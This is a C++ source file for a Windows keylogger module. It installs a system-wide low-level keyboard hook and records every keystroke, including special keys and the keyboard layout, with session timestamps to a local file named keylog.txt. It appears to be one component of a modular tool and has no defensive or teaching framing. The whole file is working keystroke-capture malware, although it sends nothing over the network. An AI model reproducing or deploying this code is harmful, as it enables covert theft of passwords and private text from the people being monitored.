#include "keylogger_module.h"
#include <iostream>
#include <fstream>
#include <windows.h>
#include <thread>
#include <chrono>
#include <iomanip>
#include <ctime>

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
DWORD WINAPI KeyloggerThread(LPVOID lpParam);
std::string getKeyboardLayoutName();
std::string getActualCharacter(int vkCode, BYTE keyboardState[256]);
std::string logNonPrintableKeys(int vkCode);
std::string getCurrentDateTime();
void ensureNewlineBeforeAppend(const std::string& filename, std::ofstream& outFile);

HANDLE hThread = nullptr;
HHOOK keyboardHook;
std::ofstream logFile;
std::string fileName = "keylog.txt";

bool shouldQuit = false;

const char* Keylogger_Module::name() const {
    return "Keylogger_Module";
}

void Keylogger_Module::run(){
    std::cout << "Keylogger Module Started" << std::endl;
    shouldQuit = false;

    hThread = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
}

void Keylogger_Module::stopKeylogger(){
    shouldQuit = true;
    if(hThread){
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        hThread = nullptr;
    }
}

DWORD WINAPI KeyloggerThread(LPVOID lpParam){
    logFile.open(fileName, std::ios::app);

    if(!logFile.is_open()){
        std::cerr << "Failed to open log file!" << std::endl;
        return 1;
    }

    //SET UP THE HOOK
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    if(!keyboardHook){
        std::cerr << "Failed to install keyboard hook! Error: " << GetLastError() << std::endl;
        return 1;
    }

    ensureNewlineBeforeAppend(fileName, logFile);
    logFile << "=== Keylogger Session Started ===" << getCurrentDateTime() << "===" << std::endl;
    logFile << "Keyboard Layout: " << getKeyboardLayoutName() << std::endl;

    logFile.flush();
    
    //GETS THE ACTION MESSAGES AND CONVERTES IT TO UNICODE CHARS. FOR INSTANCE: VK_SHIFT + VK_A => 'A'
    MSG msg;
    while(true){
        while(PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)){
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        if (shouldQuit) {
            break;
        }

        Sleep(10);
    }
    

    UnhookWindowsHookEx(keyboardHook);
    logFile << "\n=== Keylogger Session Ended ===" << getCurrentDateTime() << "===" << std::endl;
    logFile.close();
    
    return 0;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
    if(nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)){
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyboard->vkCode;

        std::string specialKey = logNonPrintableKeys(vkCode);
        if(!specialKey.empty() && specialKey[0] == '['){
            logFile << specialKey;
        }
        else{
            BYTE keyboardState[256] = {0};
            GetKeyboardState(keyboardState);

            bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
            bool isCapsOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

            if(isShiftPressed) keyboardState[VK_SHIFT] |= 0x80;
            if(isCapsOn) keyboardState[VK_CAPITAL] |= 0x01;

            //GET THE KEY AND CONVERT IT TO UTF8
            std::string key = getActualCharacter(vkCode, keyboardState);

            if(!key.empty()){
                logFile << key;
            }
        }

        logFile.flush();
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

std::string getKeyboardLayoutName() {
    HKL layout = GetKeyboardLayout(0);
    LANGID langId = LOWORD(layout);
    
    char layoutName[256];
    if (GetLocaleInfoA(MAKELCID(langId, SORT_DEFAULT), LOCALE_SENGLANGUAGE, 
                      layoutName, sizeof(layoutName))) {
        return std::string(layoutName);
    }
    return "Unknown";
}

//CONVERTS VKCODE TO UTF8 CHARACTERS
std::string getActualCharacter(int vkCode, BYTE keyboardState[256]) {
    HKL keyboardLayout = GetKeyboardLayout(0);

    // Convert virtual key to scan code
    UINT scanCode = MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC, keyboardLayout);

    // Get Unicode character
    wchar_t unicodeBuffer[3] = {0};
    int result = ToUnicodeEx(vkCode, scanCode, keyboardState, unicodeBuffer, 2, 0, keyboardLayout);

    if (result > 0) {
        // Convert Unicode to UTF-8
        char utf8Buffer[8] = {0};
        int utf8Length = WideCharToMultiByte(CP_UTF8, 0, unicodeBuffer, result, 
                                             utf8Buffer, sizeof(utf8Buffer) - 1, NULL, NULL);
        if (utf8Length > 0) {
            return std::string(utf8Buffer, utf8Length);
        }
    }

    return "";
}

//RETURNS SPECIAL KEYS
std::string logNonPrintableKeys(int vkCode){
    switch(vkCode){
                case VK_BACK: return "[BACKSPACE]";
                case VK_TAB: return "[TAB]";
                case VK_RETURN: return "[ENTER]";
                case VK_SHIFT: return "[SHIFT]";
                case VK_CONTROL: return "[CTRL]";
                case VK_MENU: return "[ALT]";
                case VK_PAUSE: return "[PAUSE]";
                case VK_CAPITAL: return "[CAPS_LOCK]";
                case VK_ESCAPE: return "[ESC]";
                case VK_SPACE: return " ";
                case VK_PRIOR: return "[PAGE_UP]";
                case VK_NEXT: return "[PAGE_DOWN]";
                case VK_END: return "[END]";
                case VK_HOME: return "[HOME]";
                case VK_LEFT: return "[ARROW_LEFT]";
                case VK_UP: return "[ARROW_UP]";
                case VK_RIGHT: return "[ARROW_RIGHT]";
                case VK_DOWN: return "[ARROW_DOWN]";
                case VK_INSERT: return "[INSERT]";
                case VK_DELETE: return "[DELETE]";
                case VK_F1: return "[F1]";
                case VK_F2: return "[F2]";
                case VK_F3: return "[F3]";
                case VK_F4: return "[F4]";
                case VK_F5: return "[F5]";
                case VK_F6: return "[F6]";
                case VK_F7: return "[F7]";
                case VK_F8: return "[F8]";
                case VK_F9: return "[F9]";
                case VK_F10: return "[F10]";
                case VK_F11: return "[F11]";
                case VK_F12: return "[F12]";
                // Numpad keys
                case VK_NUMPAD0: return "0";
                case VK_NUMPAD1: return "1";
                case VK_NUMPAD2: return "2";
                case VK_NUMPAD3: return "3";
                case VK_NUMPAD4: return "4";
                case VK_NUMPAD5: return "5";
                case VK_NUMPAD6: return "6";
                case VK_NUMPAD7: return "7";
                case VK_NUMPAD8: return "8";
                case VK_NUMPAD9: return "9";
                case VK_MULTIPLY: return "*";
                case VK_ADD: return "+";
                case VK_SUBTRACT: return "-";
                case VK_DECIMAL: return ".";
                case VK_DIVIDE: return "/";
                default:
                    return "";
    }
}

//CHECKS IF THERE IS A LOG FILE OR THE LOG FILE THAT CURRENTLY EXISTS IS EMPTY OR NOT
void ensureNewlineBeforeAppend(const std::string& filename, std::ofstream& outFile) {
    std::ifstream inFile(filename, std::ios::binary);

    if (!inFile) return;

    inFile.seekg(0, std::ios::end);
    if (inFile.tellg() == 0) return;

    inFile.seekg(-1, std::ios::end); 
    char lastChar;
    inFile.get(lastChar);

    if (lastChar != '\n' && lastChar != '\r') {
        outFile << "\r\n";
    }
}

std::string getCurrentDateTime() {
    auto now = std::chrono::system_clock::now();
    std::time_t now_time = std::chrono::system_clock::to_time_t(now);

    std::tm tm_buf;

    localtime_s(&tm_buf, &now_time);

    std::ostringstream oss;
    oss << std::put_time(&tm_buf, "%Y-%m-%d %H:%M:%S");
    return oss.str();
}

const char* Keylogger_Module::getKeylogFileName() const{
    return fileName.c_str();
}